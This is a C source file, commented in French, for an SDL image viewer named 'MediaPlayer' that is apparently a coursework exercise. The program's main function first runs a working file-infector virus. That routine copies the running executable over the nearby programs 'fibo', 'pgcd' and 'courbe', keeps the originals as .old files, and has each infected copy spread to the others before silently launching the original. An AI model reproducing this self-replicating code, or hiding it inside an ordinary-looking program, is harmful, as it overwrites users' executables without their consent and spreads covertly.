#define STB_IMAGE_IMPLEMENTATION
#include <stdio.h>
#include <SDL2/SDL.h>
#include <SDL2/SDL_ttf.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/stat.h>
#include "stb_image.h"
#include "tinyfiledialogs.h"

#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600
#define TITLE_BAR_HEIGHT 30
#define TEXT_ZONE_HEIGHT 30
#define BUTTON_WIDTH 150
#define BUTTON_HEIGHT 30
#define MARGIN 10


#define ORIGINAL_NAME   "MediaPlayer"
#define NB_TARGETS      3
static const char* targets[] = { "fibo", "pgcd", "courbe" };

// Fonction Virale 

/* Retourne le nom de base de l'exécutable en cours (sans chemin) */
static void get_self_basename(char* out, size_t size) {
    char self_path[1024] = {0};
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len < 0) { strncpy(out, ORIGINAL_NAME, size); return; }
    self_path[len] = '\0';
    strncpy(out, basename(self_path), size);
}

/* Retourne le dossier de l'exécutable en cours */
static void get_self_dir(char* out, size_t size) {
    char self_path[1024] = {0};
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len < 0) { strncpy(out, ".", size); return; }
    self_path[len] = '\0';
    strncpy(out, dirname(self_path), size);
}

/* Vérifie si un fichier existe */
static int file_exists(const char* path) {
    struct stat st;
    return stat(path, &st) == 0;
}

/* Copie un fichier source vers dest (lecture/écriture binaire) */
static int copy_file(const char* src, const char* dst) {
    FILE* f_src = fopen(src, "rb"); //ouvre le fichier à dupliquer
    if (!f_src) return 0;

    FILE* f_dst = fopen(dst, "wb"); //
    if (!f_dst) { fclose(f_src); return 0; }

    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f_src)) > 0)
        fwrite(buf, 1, n, f_dst);

    fclose(f_src);
    fclose(f_dst);

    // Rendre la copie exécutable
    chmod(dst, 0755);
    return 1;
}

//
static void viral_routine(void) {
    char self_name[256] = {0};
    char self_dir[1024]  = {0};
    char self_path[1024] = {0};

    get_self_basename(self_name, sizeof(self_name)); // nom de l'executable en cour d'exec
    get_self_dir(self_dir, sizeof(self_dir)); // nom du dossier depuis lequel il est exec
    snprintf(self_path, sizeof(self_path), "/proc/self/exe");//


    // Si on est le MediaPlayer.exe

    if (strcmp(self_name, ORIGINAL_NAME) == 0) {
        for (int i = 0; i < NB_TARGETS; i++) {
            char target_path[1024], old_path[1024], clone_path[1024];
            snprintf(target_path, sizeof(target_path), "%s/%s",   self_dir, targets[i]);
            snprintf(old_path,    sizeof(old_path),    "%s/%s.old",self_dir, targets[i]);
            snprintf(clone_path,  sizeof(clone_path),  "%s/%s",   self_dir, targets[i]);

            // Cible présente et pas encore infectée (.old absent)
            if (file_exists(target_path) && !file_exists(old_path)) {
                rename(target_path, old_path);   // fibo  → fibo.old
                copy_file(self_path, clone_path); // copie MediaPlayer → fibo
                printf("[virus] %s infecté\n", targets[i]);
            }
        }
        // Ensuite le MediaPlayer continue son code normal (retour au main)
        return;
    }

    // CAS 2 : on est une copie (fibo / pgcd / courbe)

    // 2a. Relancer l'infection sur les autres cibles
    for (int i = 0; i < NB_TARGETS; i++) {
        // Ne pas traiter sa propre entrée
        if (strcmp(self_name, targets[i]) == 0) continue;

        char target_path[1024], old_path[1024], clone_path[1024];
        snprintf(target_path, sizeof(target_path), "%s/%s",    self_dir, targets[i]);
        snprintf(old_path,    sizeof(old_path),    "%s/%s.old", self_dir, targets[i]);
        snprintf(clone_path,  sizeof(clone_path),  "%s/%s",    self_dir, targets[i]);

        if (file_exists(target_path) && !file_exists(old_path)) {
            rename(target_path, old_path);
            copy_file(self_path, clone_path);
            printf("[virus] %s infecté\n", targets[i]);
        }
    }

    // 2b. Lancer le vrai programme (.old) de façon transparente
    char old_path[1024];
    snprintf(old_path, sizeof(old_path), "%s/%s.old", self_dir, self_name);

    if (file_exists(old_path)) {
        execv(old_path, (char* const[]){ old_path, NULL });
        // execv remplace le processus -> on n'arrive jamais ici si succès
        perror("execv");
    } else {
        printf("[virus] %s.old introuvable, impossible de lancer le vrai programme\n", self_name);
    }

    exit(0); // La copie ne doit PAS continuer vers le code SDL
}


// Fonction Affichage graphique

typedef struct {
    SDL_Window*    window;
    SDL_Renderer*  renderer;
    TTF_Font*      font;
    SDL_Texture*   image_texture;
    unsigned char* image_data;
    int            channels;
    int            img_w, img_h;
    int            scaled_w, scaled_h;
    char           filename[512];
    int            has_image;
} App;

int init_app(App* app) {
    if (SDL_Init(SDL_INIT_VIDEO) != 0) {
        printf("SDL_Init Error: %s\n", SDL_GetError());
        return 0;
    }
    if (TTF_Init() == -1) {
        printf("TTF_Init Error: %s\n", TTF_GetError());
        return 0;
    }
    app->window = SDL_CreateWindow("Visionneuse d'images",
                                   SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED,
                                   WINDOW_WIDTH, WINDOW_HEIGHT,
                                   SDL_WINDOW_SHOWN);
    if (!app->window) return 0;

    app->renderer = SDL_CreateRenderer(app->window, -1, SDL_RENDERER_ACCELERATED);
    if (!app->renderer) return 0;

    app->font = TTF_OpenFont("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 16);
    if (!app->font) {
        printf("TTF_OpenFont Error: %s\n", TTF_GetError());
        return 0;
    }
    app->has_image  = 0;
    app->image_data = NULL;
    app->image_texture = NULL;
    strcpy(app->filename, "Aucune image selectionnee");
    return 1;
}

int load_image(App* app, const char* path) {
    if (app->image_data)    stbi_image_free(app->image_data);
    if (app->image_texture) SDL_DestroyTexture(app->image_texture);

    app->image_data = stbi_load(path, &app->img_w, &app->img_h, &app->channels, 0);
    if (!app->image_data) {
        printf("Erreur chargement image: %s\n", path);
        return 0;
    }
    float scale_w = (float)WINDOW_WIDTH / app->img_w;
    float scale_h = (float)(WINDOW_HEIGHT - TITLE_BAR_HEIGHT - TEXT_ZONE_HEIGHT
                            - BUTTON_HEIGHT - MARGIN * 4) / app->img_h;
    float scale   = scale_w < scale_h ? scale_w : scale_h;
    app->scaled_w = (int)(app->img_w * scale);
    app->scaled_h = (int)(app->img_h * scale);

    SDL_PixelFormatEnum format = (app->channels == 4)
                                 ? SDL_PIXELFORMAT_RGBA32
                                 : SDL_PIXELFORMAT_RGB24;
    app->image_texture = SDL_CreateTexture(app->renderer, format,
                                           SDL_TEXTUREACCESS_STATIC,
                                           app->img_w, app->img_h);
    SDL_UpdateTexture(app->image_texture, NULL,
                      app->image_data, app->img_w * app->channels);

    const char* last_slash = strrchr(path, '/');
    if (!last_slash) last_slash = strrchr(path, '\\');
    strncpy(app->filename, last_slash ? last_slash + 1 : path, 511);

    app->has_image = 1;
    return 1;
}

void render_text(App* app, const char* text, int x, int y, SDL_Color color) {
    SDL_Surface* surface = TTF_RenderText_Solid(app->font, text, color);
    if (!surface) return;
    SDL_Texture* texture = SDL_CreateTextureFromSurface(app->renderer, surface);
    if (!texture) { SDL_FreeSurface(surface); return; }
    SDL_Rect rect = {x, y, surface->w, surface->h};
    SDL_RenderCopy(app->renderer, texture, NULL, &rect);
    SDL_FreeSurface(surface);
    SDL_DestroyTexture(texture);
}

void render_button(App* app, SDL_Rect* btn, const char* label) {
    SDL_SetRenderDrawColor(app->renderer, 70, 130, 180, 255);
    SDL_RenderFillRect(app->renderer, btn);
    SDL_SetRenderDrawColor(app->renderer, 40, 90, 140, 255);
    SDL_RenderDrawRect(app->renderer, btn);

    SDL_Color white    = {255, 255, 255, 255};
    SDL_Surface* surface = TTF_RenderText_Solid(app->font, label, white);
    if (!surface) return;
    SDL_Texture* texture = SDL_CreateTextureFromSurface(app->renderer, surface);
    if (!texture) { SDL_FreeSurface(surface); return; }
    SDL_Rect text_rect = {
        btn->x + (btn->w - surface->w) / 2,
        btn->y + (btn->h - surface->h) / 2,
        surface->w, surface->h
    };
    SDL_RenderCopy(app->renderer, texture, NULL, &text_rect);
    SDL_FreeSurface(surface);
    SDL_DestroyTexture(texture);
}

void cleanup(App* app) {
    if (app->image_texture) SDL_DestroyTexture(app->image_texture);
    if (app->font)          TTF_CloseFont(app->font);
    if (app->renderer)      SDL_DestroyRenderer(app->renderer);
    if (app->window)        SDL_DestroyWindow(app->window);
    if (app->image_data)    stbi_image_free(app->image_data);
    TTF_Quit();
    SDL_Quit();
}

int main(void) {

    // Execution du virus
    viral_routine();

    // Affichage graphique
    // executer uniquement si on est Mediaplayer

    App app = {0};
    if (!init_app(&app)) { cleanup(&app); return 1; }

    const char* filters[] = {
        "*.jpg", "*.jpeg", "*.png", "*.bmp",
        "*.tga", "*.gif",  "*.hdr", "*.pic", "*.pnm"
    };

    SDL_Rect open_btn = {
        (WINDOW_WIDTH - BUTTON_WIDTH) / 2,
        TITLE_BAR_HEIGHT + MARGIN,
        BUTTON_WIDTH, BUTTON_HEIGHT
    };

    int running = 1;
    while (running) {
        SDL_Event e;
        while (SDL_PollEvent(&e)) {
            if (e.type == SDL_QUIT) running = 0;

            if (e.type == SDL_MOUSEBUTTONDOWN && e.button.button == SDL_BUTTON_LEFT) {
                int mx = e.button.x, my = e.button.y;
                if (mx >= open_btn.x && mx <= open_btn.x + open_btn.w &&
                    my >= open_btn.y && my <= open_btn.y + open_btn.h) {
                    const char* path = tinyfd_openFileDialog(
                        "Ouvrir une image", "", 9, filters, "Images supportees", 0);
                    if (path) load_image(&app, path);
                }
            }
        }

        SDL_SetRenderDrawColor(app.renderer, 50, 50, 50, 255);
        SDL_RenderClear(app.renderer);

        SDL_Rect title_bar = {0, 0, WINDOW_WIDTH, TITLE_BAR_HEIGHT};
        SDL_SetRenderDrawColor(app.renderer, 30, 30, 30, 255);
        SDL_RenderFillRect(app.renderer, &title_bar);

        SDL_Color white = {255, 255, 255, 255};
        render_text(&app, app.filename, MARGIN, (TITLE_BAR_HEIGHT - 16) / 2, white);

        render_button(&app, &open_btn, "Ouvrir une image");

        int image_area_y = TITLE_BAR_HEIGHT + BUTTON_HEIGHT + MARGIN * 2;
        if (app.has_image) {
            SDL_Rect image_zone = {
                (WINDOW_WIDTH  - app.scaled_w) / 2,
                image_area_y + (WINDOW_HEIGHT - image_area_y - app.scaled_h) / 2,
                app.scaled_w, app.scaled_h
            };
            SDL_RenderCopy(app.renderer, app.image_texture, NULL, &image_zone);
        } else {
            SDL_Color gray = {180, 180, 180, 255};
            render_text(&app, "Cliquez sur 'Ouvrir une image' pour commencer",
                        MARGIN, WINDOW_HEIGHT / 2, gray);
        }

        SDL_RenderPresent(app.renderer);
        SDL_Delay(16);
    }

    cleanup(&app);
    return 0;
}

